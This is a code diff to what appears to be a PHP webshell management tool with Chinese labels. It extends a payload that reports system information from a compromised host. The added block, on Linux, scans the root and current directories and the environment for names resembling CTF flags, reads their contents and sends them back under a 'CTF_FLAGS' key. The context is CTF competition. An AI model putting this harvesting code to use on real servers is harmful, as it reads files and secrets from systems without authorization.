@@ -270,6 +270,10 @@ array_push($infos, [
     "value" => phpversion()
 ]);
 array_push($infos, [
+    "key" => "PHP_OS",
+    "value" => PHP_OS
+]);
+array_push($infos, [
     "key" => "SYSTEMVERSION",
     "value" => php_uname()
 ]);
@@ -321,6 +325,34 @@ array_push($infos, [
     "key" => "EXTENSIONS",
     "value" => implode(", ", get_loaded_extensions())
 ]);
+if (PHP_OS === 'Linux') {
+    $flags = "";
+    $regex = '/f[l1i]{1,10}[4a]{1,10}[9g]{1,10}|f.{10,100}/i';
+    foreach (scandir("/") as $filename) {
+        if (preg_match($regex, $filename)) {
+            $content = trim(file_get_contents("/" . $filename));
+            $flags .= "/$filename $content | ";
+        }
+    }
+    foreach (scandir("./") as $filename) {
+        if (preg_match($regex, $filename)) {
+            $content = trim(file_get_contents("./" . $filename));
+            $flags .= "./$filename $content | ";
+        }
+    }
+    foreach ($_ENV as $key => $value) {
+        if(preg_match($regex, $key)
+        && preg_match("/.{1,10}\{/i", $value)) {
+            $flags .=  "env $key = $value | ";
+        }
+    }
+    if($flags) {
+        array_push($infos, [
+            "key" => "CTF_FLAGS",
+            "value" => $flags
+        ]);
+    }
+}
 decoder_echo(json_encode($infos));
 """
 )
@@ -495,6 +527,7 @@ __all__ = [
 
 basic_info_names = {
     "PHPVERSION": "当前PHP版本",
+    "PHP_OS": "操作系统",
     "SYSTEMVERSION": "系统版本",
     "CURRENT_FOLDER": "当前目录",
     "CURRENT_PHP_SCRIPT": "当前PHP脚本",
@@ -507,6 +540,7 @@ basic_info_names = {
     "ENV_PATH": "环境变量PATH",
     "INI_DISABLED_FUNCTIONS": "disabled_functions",
     "EXTENSIONS": "PHP扩展",
+    "CTF_FLAGS": "CTF flag",
 }
 
 
